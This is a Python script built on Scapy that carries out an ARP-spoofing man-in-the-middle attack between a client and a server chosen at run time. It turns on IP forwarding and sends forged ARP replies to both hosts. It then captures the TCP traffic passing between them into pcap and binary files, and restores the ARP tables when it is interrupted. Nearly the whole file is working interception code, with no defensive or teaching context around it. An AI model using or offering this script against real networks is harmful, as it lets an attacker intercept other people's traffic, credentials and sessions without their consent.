from scapy.all import *
import time
import os

def _enable_linux_ipforward():
	file_path = "/proc/sys/net/ipv4/ip_forward"
	with open(file_path) as f:
		if f.read() == 1:
			return
	with open(file_path, "w") as f:
		print(1, file=f)

def enable_ip_forwarding(verbose=True):
	if verbose:
		print("Enabling IP Forwarding")
		_enable_linux_ipforward()
	if verbose:
		print("IP Forwarding enabled")

def getmac(IP):
	ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=5, verbose=False)
	if ans:
		return ans[0][1].hwsrc

def spoof(clientIP, serverIP, MAC):
	arp_response = ARP(op=2, pdst=clientIP, hwdst=MAC, psrc=serverIP)
	send(arp_response, verbose=False)

def restore(clientIP, serverIP, clientMAC, serverMAC):
	arp_response = ARP(op=2, pdst=clientIP, hwdst=clientMAC, psrc=serverIP, hwsrc=serverMAC)
	send(arp_response, verbose=False)
	print("ARP tables restored to normal for ", clientIP)

def stream(pkt):
	if TCP in pkt:
		file.write(raw(pkt))
		wrpcap("TCPCaptureFile.pcap", pkt, append=True)
	if ARP in pkt:
		wrpcap("ARPCaptureFile.pcap", pkt, append=True)
	return

if __name__=="__main__":
	clientIP = input("Enter client's IP address: ")
	serverIP = input("Enter server's IP address: ")
	enable_ip_forwarding()
	clientMAC = getmac(clientIP)
	print("Client MAC: ", clientMAC)
	serverMAC = getmac(serverIP)
	print("Server MAC: ", serverMAC)
	file = open("tcp_packets.bin", "wb+")
	print("File Opened")
	try:
		print("Sending spoofed ARP responses")
		while True:
			spoof(clientIP, serverIP, clientMAC)
			spoof(serverIP, clientIP, serverMAC)
			sniff(prn=stream)
	except KeyboardInterrupt:
		print("\nARP spoofing stopped")
		file.close()
		restore(clientIP, serverIP, clientMAC, serverMAC)
		restore(serverIP, clientIP, serverMAC, clientMAC)
		print("ARP tables have been restored")
		quit()